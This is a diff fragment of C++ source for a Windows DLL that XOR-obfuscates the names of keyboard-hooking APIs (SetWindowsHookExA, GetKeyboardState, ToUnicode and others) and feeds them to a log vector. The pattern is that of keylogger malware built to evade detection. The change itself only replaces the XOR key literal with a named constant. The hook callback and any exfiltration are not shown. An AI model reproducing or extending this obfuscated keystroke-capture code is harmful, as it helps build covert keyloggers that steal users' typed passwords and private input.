@@ -5,7 +5,8 @@
 #include <string>
 #include <vector>
 #define DLL_EXPORT __declspec(dllexport)
-#define X_C(c) static_cast<char>((c) ^ 0xFF)
+#define HEX_K 0xFF
+#define X_C(c) static_cast<char>((c) ^ HEX_K)
 ///////////////////////////////////////////////////////////////////////
 
 HMODULE hUser32;
@@ -66,12 +67,12 @@ DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
     char obf_Get_Kbd_Stt[] = { X_C('G'), X_C('e'), X_C('t'), X_C('K'), X_C('e'), X_C('y'), X_C('b'), X_C('o'), X_C('a'), X_C('r'), X_C('d'), X_C('S'), X_C('t'), X_C('a'), X_C('t'), X_C('e'), '\0' };
     char obf_To_Unicode[] = { X_C('T'), X_C('o'), X_C('U'), X_C('n'), X_C('i'), X_C('c'), X_C('o'), X_C('d'), X_C('e'), '\0' };
 
-    for (int i = 0; obf_Usr_32[i] != '\0'; i++) obf_Usr_32[i] ^= 0xFF;
-    for (int i = 0; obf_Set_Win_Huk_ExA[i] != '\0'; i++) obf_Set_Win_Huk_ExA[i] ^= 0xFF;
-    for (int i = 0; obf_Unhuk_Win_Huk_Ex[i] != '\0'; i++) obf_Unhuk_Win_Huk_Ex[i] ^= 0xFF;
-    for (int i = 0; obf_Cal_NxtHuk_Ex[i] != '\0'; i++) obf_Cal_NxtHuk_Ex[i] ^= 0xFF;
-    for (int i = 0; obf_Get_Kbd_Stt[i] != '\0'; i++) obf_Get_Kbd_Stt[i] ^= 0xFF;
-    for (int i = 0; obf_To_Unicode[i] != '\0'; i++) obf_To_Unicode[i] ^= 0xFF;
+    for (int i = 0; obf_Usr_32[i] != '\0'; i++) obf_Usr_32[i] ^= HEX_K;
+    for (int i = 0; obf_Set_Win_Huk_ExA[i] != '\0'; i++) obf_Set_Win_Huk_ExA[i] ^= HEX_K;
+    for (int i = 0; obf_Unhuk_Win_Huk_Ex[i] != '\0'; i++) obf_Unhuk_Win_Huk_Ex[i] ^= HEX_K;
+    for (int i = 0; obf_Cal_NxtHuk_Ex[i] != '\0'; i++) obf_Cal_NxtHuk_Ex[i] ^= HEX_K;
+    for (int i = 0; obf_Get_Kbd_Stt[i] != '\0'; i++) obf_Get_Kbd_Stt[i] ^= HEX_K;
+    for (int i = 0; obf_To_Unicode[i] != '\0'; i++) obf_To_Unicode[i] ^= HEX_K;
 
 
     hUser32 = (HMODULE)LoadLibraryA(obf_Usr_32);
